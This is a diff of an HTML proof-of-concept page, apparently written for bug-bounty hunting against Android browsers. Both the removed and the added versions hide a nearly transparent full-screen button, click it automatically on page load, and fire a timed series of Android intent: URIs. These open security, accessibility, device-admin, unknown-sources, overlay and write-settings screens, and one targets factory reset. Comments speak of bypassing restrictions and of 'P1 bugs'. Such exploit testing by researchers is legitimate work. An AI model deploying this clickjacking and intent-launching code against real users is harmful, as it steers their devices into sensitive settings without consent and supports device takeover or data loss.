@@ -1,71 +1,52 @@
 <!DOCTYPE html>
 <html>
-<body style="margin: 0; padding: 0;">
-  <button onclick="triggerExploit()" 
-          style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; opacity: 0.01; cursor: default;">
-  </button>
-  
-  <script>
-    function triggerExploit() {
-      // Try these more sensitive targets
-      var targets = [
-        // Already confirmed working for you
-        'intent:#Intent;action=android.settings.DEVICE_INFO_SETTINGS;end',
-        
-        // System settings that might work
-        'intent:#Intent;action=android.settings.APPLICATION_SETTINGS;end',
-        'intent:#Intent;action=android.settings.MANAGE_ALL_APPLICATIONS_SETTINGS;end',
-        'intent:#Intent;action=android.settings.APP_NOTIFICATION_SETTINGS;end',
-        
-        // Security related (high value for bugs)
-        'intent:#Intent;action=android.settings.SECURITY_SETTINGS;end',
-        'intent:#Intent;action=android.settings.PRIVACY_SETTINGS;end',
-        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
-        
-        // Development/ADB settings
-        'intent:#Intent;action=android.settings.APPLICATION_DEVELOPMENT_SETTINGS;end',
-        'intent:#Intent;action=android.settings.DEVELOPMENT_SETTINGS;end',
-        
-        // Accessibility (critical for P1 bugs)
-        'intent:#Intent;action=android.settings.ACCESSIBILITY_SETTINGS;end',
-        
-        // Install unknown apps (very sensitive)
-        'intent:#Intent;action=android.settings.MANAGE_UNKNOWN_APP_SOURCES;end',
-        'intent:#Intent;action=android.settings.MANAGE_OVERLAY_PERMISSION;end',
-        
-        // Notification access
-        'intent:#Intent;action=android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS;end',
-        
-        // Usage access
-        'intent:#Intent;action=android.settings.USAGE_ACCESS_SETTINGS;end',
-        
-        // Device admin
-        'intent:#Intent;action=android.settings.ACTION_ADD_DEVICE_ADMIN;end',
-        
-        // Dreamy bonus - try if package name works
-        'intent:#Intent;package=com.android.settings;action=android.intent.action.MAIN;end',
-        
-        // Component targeting (may bypass restrictions)
-        'intent:#Intent;component=com.android.settings/.Settings;end',
-        'intent:#Intent;component=com.android.settings/.Settings$SecuritySettingsActivity;end',
-        'intent:#Intent;component=com.android.settings/.Settings$AccessibilitySettingsActivity;end',
-        
-        // Special intents with extras
-        'intent:#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;S.android.provider.extra.APP_PACKAGE=com.android.chrome;end',
-      ];
-      
-      // Try each one
-      targets.forEach((target, index) => {
-        setTimeout(() => {
-          console.log('Trying:', target);
-          window.location = target;
-        }, index * 200);
-      });
-    }
+<body>
+<button onclick="testDangerousIntents()" style="width:100vw;height:100vh;opacity:0.01;">
+</button>
+
+<script>
+function testDangerousIntents() {
+  // These are more invasive - may trigger security warnings
+  const dangerousIntents = [
+    // Factory reset (EXTREMELY DANGEROUS - will prompt)
+    'intent:#Intent;action=android.intent.action.FACTORY_RESET;end',
     
+    // Power menu
+    'intent:#Intent;action=android.intent.action.ACTION_POWER_USAGE_SUMMARY;end',
+    
+    // Display over other apps permission
+    'intent:#Intent;action=android.settings.action.MANAGE_OVERLAY_PERMISSION;S.package=com.android.settings;end',
+    
+    // Write system settings (if exposed)
+    'intent:#Intent;action=android.settings.action.MANAGE_WRITE_SETTINGS;S.package=com.android.settings;end',
+    
+    // Battery optimization ignore
+    'intent:#Intent;action=android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS;end',
+    
+    // Picture-in-picture settings
+    'intent:#Intent;action=android.settings.PICTURE_IN_PICTURE_SETTINGS;S.android:app_package=com.android.settings;end',
+    
+    // VR service settings
+    'intent:#Intent;action=android.settings.VR_LISTENER_SETTINGS;end',
+    
+    // Print service settings
+    'intent:#Intent;action=android.settings.ACTION_PRINT_SETTINGS;end',
+  ];
+  
+  dangerousIntents.forEach((intent, i) => {
     setTimeout(() => {
-      document.querySelector('button').click();
-    }, 500);
-  </script>
+      console.log('Testing dangerous intent:', intent.substring(0, 50) + '...');
+      try {
+        window.location = intent;
+      } catch(e) {
+        console.error('Failed:', e.message);
+      }
+    }, i * 500);
+  });
+}
+
+// Auto-trigger
+setTimeout(() => document.querySelector('button').click(), 1000);
+</script>
 </body>
 </html>
